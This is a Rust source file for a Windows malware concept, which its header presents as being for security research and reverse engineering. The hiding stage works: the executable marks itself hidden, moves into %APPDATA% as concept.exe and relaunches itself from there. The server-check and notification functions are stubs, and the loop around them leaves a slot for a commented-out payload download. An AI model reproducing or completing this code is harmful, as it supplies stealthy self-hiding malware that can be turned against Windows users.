/**
 * Application:  concept.exe
 *
 * Created by:   VPR
 * Created:      February 10, 2024
 *
 * Updated by:   VPR
 * Updated:      February 12, 2024
 *
 * Description: This is a concept for malware written in rust for security
 *              research & reverse engineering purposes.
 *
 *              It CAN move itself into the user's AppData/Roaming and change
 *              it's file attributes to hidden, so if you execute on yourself,
 *              that's where you will end up finding it.
 *
 * Disclaimer:  I won't take any responsibility for any crimes or malicious
 *              activity used with either fragments or sections of this source
 *              code. Don't be an idiot.
**/

// Variables
use std::ffi::{CString, NulError};
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;

use winapi::um::winbase::{
    MOVEFILE_COPY_ALLOWED,
    MOVEFILE_REPLACE_EXISTING
};

// Functions
use std::path::{
    /*Path,*/
    PathBuf
};
use std::process::{
    Command,
    Stdio
};

use std::os::windows::ffi::OsStrExt;

use winapi::um::fileapi::{
    GetFileAttributesA,
    SetFileAttributesA,
};

use winapi::um::winbase::MoveFileExA;

fn pathbuf_to_const_i8_pointer(path_buf: &PathBuf) -> Result<*const i8, NulError> {
    // Convert PathBuf to OsStr
    let os_str = path_buf.as_os_str();

    // Encode OsStr to a wide character iterator
    let wide_chars: Vec<u16> = os_str.encode_wide().collect();

    // Convert the wide character vector to a String (UTF-8)
    let string_utf8 = String::from_utf16(&wide_chars).expect("Invalid UTF-16");

    // Convert the UTF-8 String to a CString
    let c_str = CString::new(string_utf8)?;

    // Get a *const i8 pointer from the CString
    Ok(c_str.into_raw() as *const i8) // into_raw to avoid dealloc; remember to convert back to CString and drop it to avoid memory leak
}

fn is_in_target_path() -> bool {
    true
}

fn is_connected_to_server() -> bool {
    true
}

fn is_temp_file() -> bool {
    true
}

fn rerun_self(new_path: &String) {
    Command::new(new_path)
        .args(["acbdefg"])
        .stdout(Stdio::inherit())
        .stderr(Stdio::inherit())
        .output()
        .expect("failed to execute");

    std::process::exit(0)
}

fn send_notification() {

}

fn hide_file(path: &PathBuf) -> Result<String, ()> {
    let path_str = pathbuf_to_const_i8_pointer(path).unwrap();
    let new_path = std::env::var("APPDATA").unwrap() + "\\concept.exe";
    let c_new_path = CString::new(new_path).expect("");

    unsafe {
        // Set Attributes to Hidden
        let attributes = GetFileAttributesA(path_str);
        let set_result = SetFileAttributesA(
            path_str,
            attributes | FILE_ATTRIBUTE_HIDDEN
        );

        if set_result == 0 {
            return Err(())
        }


        // Move to %AppData%
        let move_result = MoveFileExA(
            path_str,
            c_new_path.as_ptr() as *const i8,
            MOVEFILE_COPY_ALLOWED | MOVEFILE_REPLACE_EXISTING

        );

        if move_result == 0 {
            return Err(())
        }
    }

    Ok(c_new_path.into_string().unwrap())
}

fn main() {
    let current_exe_path: PathBuf = std::env::current_exe().unwrap();
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 2 {
        match hide_file(&current_exe_path) {
            Ok(hidden_file) => {
                println!("{} ", hidden_file);
                rerun_self(&hidden_file);
            },
            Err(_) => ()
        }
    }

    if is_in_target_path() {
        send_notification();
    }

    for _ in 0..5 {
        if is_connected_to_server() {
            // download_payload();
        }

        let minute_ms = std::time::Duration::from_millis(60_000);
        std::thread::sleep(minute_ms);
    }
}
